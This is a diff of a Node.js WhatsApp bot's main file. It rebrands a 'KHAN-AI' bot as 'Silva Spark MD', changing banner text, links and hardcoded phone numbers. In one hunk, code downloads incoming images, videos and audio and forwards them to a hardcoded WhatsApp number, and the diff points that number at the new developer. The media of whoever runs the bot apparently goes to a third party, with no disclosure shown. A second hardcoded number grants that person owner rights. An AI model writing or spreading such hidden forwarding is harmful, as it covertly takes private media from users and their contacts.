@@ -41,7 +41,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
   
-  const ownerNumber = ['923146190772']
+  const ownerNumber = ['254700143167']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -80,7 +80,7 @@ const {
   //=============================================
   
   async function connectToWA() {
-  console.log("Connecting to WhatsApp ⏳️...");
+  console.log("Connecting silva spark to WhatsApp ⏳️...");
   const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
   var { version } = await fetchLatestBaileysVersion()
   
@@ -100,7 +100,7 @@ const {
   connectToWA()
   }
   } else if (connection === 'open') {
-  console.log('🧬 Installing Plugins')
+  console.log('🧬 Installing silva spark Plugins')
   const path = require('path');
   fs.readdirSync("./plugins/").forEach((plugin) => {
   if (path.extname(plugin).toLowerCase() == ".js") {
@@ -110,8 +110,8 @@ const {
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*Hello there KHAN-AI User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet KHAN-AI WhatsApp Bot.\n\n *Thanks for using KHAN-AI \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VatOy2EAzNc2WcShQw1j\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/JawadYTX/KHAN-AI\n\n> © Powered BY JawadTechX \ud83d\udda4`;
-  conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/89xq3r.jpg` }, caption: up })
+  let up = `*Hello there ✦ Silva ✦ Spark ✦ MD ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by Silva Tech Inc \ud83c\udf8a, Meet ✦ Silva ✦ Spark ✦ MD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ Silva ✦ Spark ✦ MD ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VaAkETLLY6d8qhLmZt2v\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/SilvaTechB/silva-spark-md\n\n> © Powered BY ✦ Silva ✦ Spark ✦ MD ✦ \ud83d\udda4`;
+  conn.sendMessage(conn.user.id, { image: { url: `https://i.imgur.com/PEZ5QL2.jpeg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)  
@@ -144,14 +144,14 @@ const {
     if (jawadik.message.imageMessage) {
     let cap = jawadik.message.imageMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
-    return conn.sendMessage("923146190772@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254700143167@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.videoMessage) {
     let cap = jawadik.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-    return conn.sendMessage("923146190772@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254700143167@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-    return conn.sendMessage("923146190772@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254700143167@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
@@ -526,9 +526,9 @@ const {
          
   //================ownerreact==============
   
-  if(senderNumber.includes("923146190772")){
+  if(senderNumber.includes("254700143167")){
   if(isReact) return
-  m.react("👑")
+  m.react("🦄")
   }
   
   //==========public react============//
@@ -612,7 +612,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("KHAN-MD STARTED ✅");
+  res.send("silva spark RUNNING ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
